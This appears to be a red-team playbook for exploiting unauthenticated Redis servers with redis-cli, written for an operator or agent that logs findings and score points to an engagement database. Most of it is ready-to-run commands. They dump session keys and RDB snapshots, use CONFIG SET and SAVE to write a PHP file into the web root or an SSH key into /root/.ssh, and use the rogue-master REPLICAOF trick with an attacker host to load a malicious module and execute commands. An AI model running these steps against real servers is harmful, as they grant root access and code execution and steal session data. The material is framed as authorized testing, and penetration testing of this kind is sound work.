# Redis Unauthorized Access with redis-cli

Drives an exposed Redis instance from the command line: fingerprint it, read the keyspace without disturbing it, then choose the cheapest write primitive that turns cache access into data, a credential, or a server-side shell. Extraction artifacts land under `RESULT_DIR` (key inventories, an RDB snapshot, the written payload) and the accepted results become rows in the engagement database — `finding`, `credential`, `webshell`, and the matching score hits.

`RESULT_DIR` is the engagement result directory (`runs/` under the engagement root unless the operator points it elsewhere).

## When to use

- `6379` (or `6380`, or a shifted port) answers `PING` with `PONG` and no `AUTH`.
- A web application's cache or session store is reachable and its keys may contain tokens, serialized sessions, or job payloads.
- You need a file-write primitive on a host whose web root or SSH directory is known and where the Redis process runs with enough privilege to write there.
- Not for: an instance that answers `NOAUTH`. A password-protected Redis is a `credential-attack` target, not this one.

## Prerequisites

Every step below has a fallback and nothing in this list is mandatory — if a tool is missing, use the fallback named beside it.

- `redis-cli` — `apt install redis-tools`. Fallback: `printf 'PING\r\n' | nc -w 3 TARGET PORT`; RESP is a plain text protocol, so `nc` covers every read command used here.
- `curl` for verifying a written web file — fallback `wget -qO-`.
- `redis-rdb-tools` for offline snapshot analysis — `apt install python3-redis-rdb-tools` (provides `rdb`). Fallback: `strings` on the `.rdb` file, which usually recovers cached tokens and JSON blobs.
- `proxychains4` when the instance is internal — `apt install proxychains4`, always with `-f runs/proxychains-<port>.conf`, never by editing the system config. Fallback: `redis-cli` through a `socks5` listener is not supported, so run `redis-cli` on the tunnel host or use `nc` through `proxychains`.
- An outbound callback for the replica path needs `VPS_HOST` and `LPORT` to be reachable; if they are not, the file-write paths still work.

## Workflow

1. Fingerprint the instance. Everything below is read-only up to step 6.

```
redis-cli -h TARGET -p PORT --no-auth-warning PING
redis-cli -h TARGET -p PORT --no-auth-warning INFO server | egrep 'redis_version|os|tcp_port|executable|config_file|uptime'
redis-cli -h TARGET -p PORT --no-auth-warning INFO keyspace
redis-cli -h TARGET -p PORT --no-auth-warning CONFIG GET dir dbfilename save appendonly
redis-cli -h TARGET -p PORT --no-auth-warning ACL LIST
```

2. Size the data set before you touch it. `DBSIZE` is constant time; `KEYS` is not.

```
redis-cli -h TARGET -p PORT --no-auth-warning -n 0 DBSIZE
redis-cli -h TARGET -p PORT --no-auth-warning --scan --pattern 'sess:*' | head -20
redis-cli -h TARGET -p PORT --no-auth-warning --bigkeys | head -40
```

3. Classify the keyspace. Types tell you what the application does with Redis, and therefore what is worth extracting.

```
redis-cli -h TARGET -p PORT --no-auth-warning TYPE sess:9f2c
redis-cli -h TARGET -p PORT --no-auth-warning TTL sess:9f2c
redis-cli -h TARGET -p PORT --no-auth-warning PUBSUB CHANNELS '*' | head
```

4. Extract the values that matter. Prefer a full snapshot over key-by-key reads on anything larger than a few thousand keys.

```
redis-cli -h TARGET -p PORT --no-auth-warning GET sess:9f2c | tee RESULT_DIR/redis-sess-TARGET.txt
redis-cli -h TARGET -p PORT --no-auth-warning LRANGE queue:jobs 0 -1 | head -40

redis-cli -h TARGET -p PORT --no-auth-warning --rdb RESULT_DIR/redis-TARGET.rdb
rdb --command json --key 'sess:.*' RESULT_DIR/redis-TARGET.rdb | head -20
```

5. Look for an authentication bypass before writing anything. Old builds leak the password hash through `CONFIG GET requirepass`; new ones only expose ACL rules.

```
redis-cli -h TARGET -p PORT --no-auth-warning CONFIG GET requirepass
redis-cli -h TARGET -p PORT --no-auth-warning ACL GETUSER default
```

6. Escalate. Take the first path that fits what step 1 told you, and save the original configuration first — you will restore it in step 9.

```
redis-cli -h TARGET -p PORT --no-auth-warning CONFIG GET dir dbfilename \
  > RESULT_DIR/redis-config-orig-TARGET.txt
```

Path A — web root file write (PHP target, web root known):

```
redis-cli -h TARGET -p PORT --no-auth-warning CONFIG SET dir /var/www/html
redis-cli -h TARGET -p PORT --no-auth-warning CONFIG SET dbfilename probe.php
redis-cli -h TARGET -p PORT --no-auth-warning SET probe '\n\n<?php echo "PROBE_OK"; ?>'
redis-cli -h TARGET -p PORT --no-auth-warning SAVE
curl -s http://TARGET/probe.php
```

Path B — SSH key write (Redis running as root, `/root/.ssh` writable):

```
redis-cli -h TARGET -p PORT --no-auth-warning CONFIG SET dir /root/.ssh
redis-cli -h TARGET -p PORT --no-auth-warning CONFIG SET dbfilename authorized_keys
redis-cli -h TARGET -p PORT --no-auth-warning SET k '\n\nssh-rsa AAAAB3Nza... operator@lab'
redis-cli -h TARGET -p PORT --no-auth-warning SAVE
ssh -i RESULT_DIR/id_rsa -o StrictHostKeyChecking=no root@TARGET 'id'
```

Path D — module load, which needs a `.so` on the target. Use the replica trick to push it when outbound traffic is allowed:

```
redis-cli -h TARGET -p PORT --no-auth-warning REPLICAOF VPS_HOST LPORT
# a rogue master on VPS_HOST:LPORT answers with a FULLRESYNC payload carrying exp.so,
# which lands in the configured dir; then point MODULE LOAD at it
redis-cli -h TARGET -p PORT --no-auth-warning MODULE LOAD /var/tmp/exp.so
redis-cli -h TARGET -p PORT --no-auth-warning system.exec 'id'
```

7. Verify each write independently of Redis's own reply. `SAVE` returning `OK` is not proof that a file serves.

```
curl -s -o RESULT_DIR/redis-write-proof.txt -w '%{http_code}\n' http://TARGET/probe.php
```

8. Record the finding, the credential, and the score while the transcript exists.

```
redteam_vuln_add title='Redis unauthenticated access with CONFIG SET write' severity=critical target=TARGET_IP \
  source='redis-cli' status=exploited confidence=high \
  evidence='PING -> PONG; CONFIG GET dir -> /var/www/html; SAVE wrote probe.php; GET /probe.php returned PROBE_OK' \
  gained='web root file write and a PHP execution path on web01'

redteam_score_hit code=db-credential points=10 target=TARGET_IP port=6379 \
  evidence='redis-cli INFO keyspace returned db0 with 412 keys; no AUTH required'

redteam_chain_add stage=exploit title='redis CONFIG SET write to web root' \
  tool='redis-cli CONFIG SET dir /var/www/html; SET probe ...; SAVE' result='probe.php served PROBE_OK'
```

9. Restore the instance to the configuration you found. This is the difference between a finding and an outage.

```
redis-cli -h TARGET -p PORT --no-auth-warning CONFIG SET dir "$(awk '/^dir/{print $2}' RESULT_DIR/redis-config-orig-TARGET.txt)"
redis-cli -h TARGET -p PORT --no-auth-warning CONFIG SET dbfilename "$(awk '/^dbfilename/{print $2}' RESULT_DIR/redis-config-orig-TARGET.txt)"
redis-cli -h TARGET -p PORT --no-auth-warning CONFIG GET dir dbfilename
```

## Output and evidence

Files under `RESULT_DIR`:

- `redis-config-orig-<host>.txt` — the original `dir`/`dbfilename`, the restore source.
- `redis-<host>.rdb` plus the `rdb --command json` or `strings` output — the extracted cache contents.
- `redis-write-proof.txt` — the response of the written file or key, the difference between a claim and a result.

Database rows:

- `finding` via `redteam_vuln_add`: severity `high` for read-only exposure, `critical` once a write primitive is confirmed; `status=exploited` only after a verified shell or file.
- `credential` via `redteam_credential_add` for `requirepass` values or application credentials recovered from cache entries.
- `webshell` via `redteam_webshell_add` when the written file is a client-usable shell — hand the payload work to `webshell-toolkit`.
- Score hit via `redteam_score_hit`: `db-credential` with `points=10` is the correct tier for an unauthenticated or blank-password instance, `points=50` only when the recovered account is administrative. A verified shell upgrades the result to `server-host` (`points=10` normal, `points=50` admin) — claim the higher tier once, per system, never both.
- Chain step via `redteam_chain_add` with `stage=exploit` and the literal `redis-cli` command in `tool`.

What counts as evidence: the `INFO keyspace` or `INFO server` response proving unauthenticated access, plus the output of a second command that only a client could obtain (`CONFIG GET dir`, a `GET` of a real key), plus — for a write — the HTTP body of the written file. A banner or `PONG` alone is a surface, not a finding.

## Failure modes

- `(error) NOAUTH Authentication required` → the instance is protected. Record the surface, stop, and route the account work to `credential-attack`.
- `(error) DENIED Redis is running in protected mode` → `protected-mode yes` with no password and no bind directive. Writes are refused; only local sockets work. Look for an SSRF or a local shell instead.
- `(error) MISCONF Redis is configured to save RDB snapshots, but it is currently not able to persist on disk` → the `dir` is not writable or the disk is full. Restore `dir`, or use `CONFIG SET appendonly no` only after recording the original value.
- `(error) READONLY You can't write against a read only replica` → this node is a replica. Find the master from `INFO replication` and attack that address.
- `(error) ERR Changing directory: Permission denied` → the Redis process cannot write the target path. Try a path it owns (`/var/lib/redis`, `/tmp`), or a directory the web server reads.
- `(error) ERR unknown command 'MODULE'` → modules are disabled or the build lacks them. Skip path D entirely.

## Notes

- Never run `KEYS *`, `FLUSHALL`, `FLUSHDB`, `CONFIG REWRITE`, `SHUTDOWN`, or `CLIENT KILL` on a production instance. `MONITOR` is acceptable for a few seconds, never for minutes.
- Throttle scans with `RATE`: `SCAN` with `COUNT 200` plus `-i 0.05`, or `--scan --pattern` piped through `head` when you only need samples.
- Cleanup is part of the result. An instance left pointing at a deleted directory breaks the application on its next `BGSAVE`, and that is how findings get reclassified as damage.
